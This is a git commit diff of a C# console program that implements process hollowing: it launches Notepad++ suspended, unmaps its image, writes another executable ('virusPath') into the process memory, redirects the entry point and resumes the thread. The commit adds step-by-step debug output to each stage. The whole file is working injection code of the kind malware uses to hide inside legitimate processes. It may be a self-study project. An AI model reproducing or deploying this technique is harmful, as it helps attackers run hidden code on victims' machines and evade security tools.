1acf7d61e3138007efbe515293307a3d1717f020
Muhammad Razali <wireless-@hotmail.com>
2021-06-23 22:05:57 +0800

    added console debugs

--- ConsoleApp1/ConsoleApp1/Program.cs
+++ ConsoleApp1/ConsoleApp1/Program.cs
@@ -1,6 +1,7 @@
 ﻿using ProcessInjector;
 using System;
 using System.IO;
+using System.Linq;
 using System.Runtime.InteropServices;
 
 namespace ConsoleApp1
@@ -23,10 +24,11 @@ namespace ConsoleApp1
         static void Main(string[] args)
         {
             //Paths to our files
-            string notepadPath = @"D:\Program Files\Notepad++\notepad++.exe";
+            string victimPath = @"D:\Program Files\Notepad++\notepad++.exe";
             string virusPath = @"C:\Windows\System32\calc.exe";
-
-            byte[] victimFileBytes = File.ReadAllBytes(notepadPath);
+            virusPath = @"C:\Users\Razali\source\repos\WindowsPE\x64\Release\Project2.exe";
+            virusPath = @"D:\Program Files\GNS3\TvnViewer.exe";
+            byte[] victimFileBytes = File.ReadAllBytes(victimPath);
             IntPtr victimFilePointer = Marshal.UnsafeAddrOfPinnedArrayElement(victimFileBytes, 0);
 
 
@@ -34,14 +36,16 @@ namespace ConsoleApp1
             IntPtr virusFilePointer = Marshal.UnsafeAddrOfPinnedArrayElement(virusFileBytes, 0);
 
 
+            Console.WriteLine($"Injecting {Path.GetFileName(virusPath)} into {Path.GetFileName(victimPath)}");
 
             #region Create Victim Process in Suspended State 
+            Console.WriteLine($"[+] Creating Victim Process {Path.GetFileName(victimPath)}");
             PInvoke.STARTUPINFO startupInfo = new PInvoke.STARTUPINFO();
             PInvoke.PROCESS_INFORMATION processInformation = new PInvoke.PROCESS_INFORMATION();
 
             bool couldNotCreateProcess = !PInvoke.CreateProcess(
                                                 lpApplicationName: null,
-                                                lpCommandLine: notepadPath,
+                                                lpCommandLine: victimPath,
                                                 lpProcessAttributes: IntPtr.Zero,
                                                 lpThreadAttributes: IntPtr.Zero,
                                                 bInheritHandles: false,
@@ -53,11 +57,11 @@ namespace ConsoleApp1
                                             );
             if (couldNotCreateProcess)
             {
-                Console.WriteLine("Failed to create victim process...");
-
+                Console.WriteLine("[*] Failed to create victim process...");
+                return;
             }
 
-            Console.WriteLine($"Successfully created victim process...");
+            Console.WriteLine($"\t[*] Successfully created victim process {Path.GetFileName(victimPath)}");
 
             #endregion
 
@@ -66,94 +70,141 @@ namespace ConsoleApp1
             #region Getting ThreadContext
 
             //I need  threadHandle and threadContext
+            Console.WriteLine($"[+] Retrieving Thread Handle of {Path.GetFileName(victimPath)}");
             IntPtr victimThreadHandle = processInformation.hThread;
-            
-            PInvoke.CONTEXT64 threadContext = new PInvoke.CONTEXT64() { ContextFlags = PInvoke.CONTEXT_FLAGS.CONTEXT_ALL };
+            Console.WriteLine($"\t[*] Thread Handle at  0x{(long)victimThreadHandle:X2}");
 
+            Console.WriteLine($"[+] Allocating unmanaged memory for ThreadContext of {Path.GetFileName(victimPath)}");
+            PInvoke.CONTEXT64 victimThreadContext = new PInvoke.CONTEXT64() { ContextFlags = PInvoke.CONTEXT_FLAGS.CONTEXT_ALL };
             IntPtr pVictimThreadContext = Allocate(Marshal.SizeOf<PInvoke.CONTEXT64>(), 16);
 
-            Marshal.StructureToPtr<PInvoke.CONTEXT64>(threadContext, pVictimThreadContext, false);
 
+            Marshal.StructureToPtr<PInvoke.CONTEXT64>(victimThreadContext, pVictimThreadContext, false);
+
+            Console.WriteLine($"[+] Retrieving ThreadContext of {Path.GetFileName(victimPath)}");
             PInvoke.GetThreadContext(victimThreadHandle, pVictimThreadContext);
 
-            PInvoke.CONTEXT64 victimThreadContext = Marshal.PtrToStructure<PInvoke.CONTEXT64>(pVictimThreadContext);
+            victimThreadContext = Marshal.PtrToStructure<PInvoke.CONTEXT64>(pVictimThreadContext);
 
             #endregion
 
             #region Get Victim Image Base
-
+            Console.WriteLine($"[+] Retrieving ImageBase Address of {Path.GetFileName(victimPath)}");
             ulong rdx = victimThreadContext.Rdx;
             ulong victimImageBaseAddress = rdx + 16;
-            IntPtr victimProcessHandle = processInformation.hProcess;
-            IntPtr victimImageBase = Marshal.AllocHGlobal(8);
-            PInvoke.ReadProcessMemory(victimProcessHandle, victimImageBaseAddress, victimImageBase, 8, out _);
+            Console.WriteLine($"\t[*] {Path.GetFileName(victimPath)}'s ImageBase Address is 0x{victimImageBaseAddress:X2}");
 
+            IntPtr victimProcessHandle = processInformation.hProcess;
+
+            Console.WriteLine($"[+] Allocating unmanaged memory for {Path.GetFileName(victimPath)}'s ImageBase");
+            IntPtr victimImageBase = Marshal.AllocHGlobal(8);
+            Console.WriteLine($"[+] Reading ImageBase from {Path.GetFileName(victimPath)}'s ImageBase Address");
+            PInvoke.ReadProcessMemory(victimProcessHandle, victimImageBaseAddress, victimImageBase, 8, out _);
+            Console.WriteLine($"\t[*] ImageBase is 0x{victimImageBaseAddress:X2}");
             #endregion
             #region Unmap old data
+            Console.WriteLine($"[+] Unmapping {Path.GetFileName(victimPath)}'s Image");
             if (PInvoke.ZwUnmapViewOfSection(victimProcessHandle, victimImageBase) == PInvoke.NTSTATUS.STATUS_ACCESS_DENIED)
             {
-                Console.WriteLine("Failed to unmap section...");
+                Console.WriteLine("\t[*] Failed to unmap section...");
                 return;
             }
+            Console.WriteLine("\t[*] Successfully unmapped...");
             #endregion
 
             #region Allocate Space for virus image
+            Console.WriteLine($"[+] Retrieving E_LFANEW of {Path.GetFileName(virusPath)}");
             int virusElfanew = Marshal.ReadInt32(virusFilePointer, PInvoke.Offsets.E_LFANEW);
-            long virusImageBase = Marshal.ReadInt64(virusFilePointer, virusElfanew + 0x30);
-            uint sizeOfVirusImage = (uint)Marshal.ReadInt32(virusFilePointer, virusElfanew + 0x50);
-            IntPtr allocatedNewRegionForVirus =  PInvoke.VirtualAllocEx(victimProcessHandle, (IntPtr)virusImageBase, sizeOfVirusImage, PInvoke.AllocationType.Reserve | PInvoke.AllocationType.Commit, PInvoke.MemoryProtection.ExecuteReadWrite);
+            Console.WriteLine($"\t[*] E_LFANEW is 0x{virusElfanew:X2}");
 
+            Console.WriteLine($"[+] Retrieving {Path.GetFileName(virusPath)}'s ImageBase");
+            long virusImageBase = Marshal.ReadInt64(virusFilePointer, virusElfanew + 0x30);
+            Console.WriteLine($"\t[*] ImageBase is 0x{virusImageBase:X2}");
+            Console.WriteLine($"[+] Retrieving Size of {Path.GetFileName(virusPath)}");
+            uint sizeOfVirusImage = (uint)Marshal.ReadInt32(virusFilePointer, virusElfanew + 0x50);
+            Console.WriteLine($"\t[*] Size is 0x{sizeOfVirusImage:X2}");
+
+            Console.WriteLine($"[+] Allocating space for {Path.GetFileName(virusPath)}'s Image");
+            IntPtr allocatedNewRegionForVirus =  PInvoke.VirtualAllocEx(victimProcessHandle, (IntPtr)virusImageBase, sizeOfVirusImage, PInvoke.AllocationType.Reserve | PInvoke.AllocationType.Commit, PInvoke.MemoryProtection.ExecuteReadWrite);
+            Console.WriteLine($"\t[*] Space allocated at 0x{allocatedNewRegionForVirus:X2}");
             #endregion
 
             #region Write new headers
+            Console.WriteLine($"[+] Retrieving {Path.GetFileName(virusPath)}'s Header Size");
             uint sizeOfVirusHeaders = (uint)Marshal.ReadInt32(virusFilePointer, virusElfanew + 0x54);
+            Console.WriteLine($"\t[*] Header Size is 0x{sizeOfVirusHeaders:X2}");
+
+            Console.WriteLine($"[+] Writing Headers of {Path.GetFileName(virusPath)} into {Path.GetFileName(victimPath)} at 0x{allocatedNewRegionForVirus:X2}");
+            
             if (!PInvoke.WriteProcessMemory(victimProcessHandle, allocatedNewRegionForVirus, virusFilePointer, sizeOfVirusHeaders, out _))
             {
-                Console.WriteLine("Writing headers failed...");
+                Console.WriteLine("\t[*] Writing headers failed...");
                 return;
             };
+            Console.WriteLine("\t[*] Headers successfully written...");
             #endregion
 
             #region Write Sections and relocate if necessary
 
+            Console.WriteLine($"[+] Retrieving {Path.GetFileName(virusPath)}'s number of Sections");
             int numberOfSections = Marshal.ReadInt16(virusFilePointer, virusElfanew + 0x6);
+            Console.WriteLine($"\t[*] Number of sections is  {numberOfSections}");
+
             int sizeOfOptionalHeader = Marshal.ReadInt16(virusFilePointer + virusElfanew + 0x10 + 0x04);
             int sizeOfImageSectionHeader = Marshal.SizeOf<PInvoke.IMAGE_SECTION_HEADER>();
+            
             for (int i = 0; i < numberOfSections; i++)
             {
+                Console.WriteLine($"[+] Copying Section {i+1}");
                 IntPtr sectionHeaderPointer = virusFilePointer + virusElfanew + 0x18 + sizeOfOptionalHeader + (i * sizeOfImageSectionHeader);
                 PInvoke.IMAGE_SECTION_HEADER sectionHeader = Marshal.PtrToStructure<PInvoke.IMAGE_SECTION_HEADER>(sectionHeaderPointer);
-
+                Console.WriteLine($"\t[*] Name: {String.Join("", sectionHeader.Name.Select(o => o.ToString()).ToArray())}");
                 uint virtualAddress = sectionHeader.VirtualAddress;
+                Console.WriteLine($"\t[*] Relative Virtual Address: 0x{virtualAddress:X2}");
                 uint sizeOfRawData = sectionHeader.SizeOfRawData;
+                Console.WriteLine($"\t[*] Size of Raw Data: 0x{sizeOfRawData:X2}");
                 uint pointerToRawData = sectionHeader.PointerToRawData;
+                Console.WriteLine($"\t[*] Pointer to Raw Data: 0x{pointerToRawData:X2}");
 
                 byte[] bRawData = new byte[sizeOfRawData];
                 Buffer.BlockCopy(virusFileBytes, (int)pointerToRawData, bRawData, 0, bRawData.Length);
 
                 PInvoke.WriteProcessMemory(victimProcessHandle, (IntPtr)(virusImageBase + virtualAddress), Marshal.UnsafeAddrOfPinnedArrayElement(bRawData, 0), (uint)bRawData.Length, out _);
-
+                Console.WriteLine();
             }
             #endregion
-            long rdxx = Marshal.ReadInt64(pVictimThreadContext, 0x88);
-            byte[] bImageBase = BitConverter.GetBytes((long)virusImageBase);
+           
+
             #region Rewrite Victim ImageBase to Virus ImageBase
+            byte[] bImageBase = BitConverter.GetBytes((long)virusImageBase);
+
+            Console.WriteLine($"[+] ReWriting {Path.GetFileName(virusPath)}'s ImageBase 0x{virusImageBase:X2} in memory");
             if (!PInvoke.WriteProcessMemory(victimProcessHandle, (IntPtr)victimImageBaseAddress, bImageBase, 0x8, out _))
             {
-                Console.WriteLine("Rewriting image base failed...");
+                Console.WriteLine("\t[*]Rewriting image base failed...");
                 return;
             }
+            Console.WriteLine($"\t[*] ImageBase rewriting successful...");
             #endregion
 
             #region Rewrite Victim EntryPoint to Virus EntryPoint
+            Console.WriteLine($"[+] ReWriting {Path.GetFileName(virusPath)}'s EntryPoint 0x{virusImageBase:X2} in ThreadContext");
             int virusEntryPointRVA = Marshal.ReadInt32(virusFilePointer, virusElfanew + 0x28);
             victimThreadContext.Rcx = (ulong)allocatedNewRegionForVirus +  (ulong)virusEntryPointRVA;
             Marshal.StructureToPtr(victimThreadContext, pVictimThreadContext, true);
+            Console.WriteLine($"\t[*] EntryPoint rewriting successful...");
 
+            Console.WriteLine($"[+] Setting ThreadContext");
             PInvoke.SetThreadContext(victimThreadHandle, pVictimThreadContext);
             #endregion
 
+            Console.WriteLine($"[+] All set and ready to go!");
+            Console.WriteLine($"[+] Resuming Thread...");
             PInvoke.ResumeThread(victimThreadHandle);
+
+
+            Marshal.FreeHGlobal(pVictimThreadContext);
+            Marshal.FreeHGlobal(victimImageBase);
         }
     }
 }
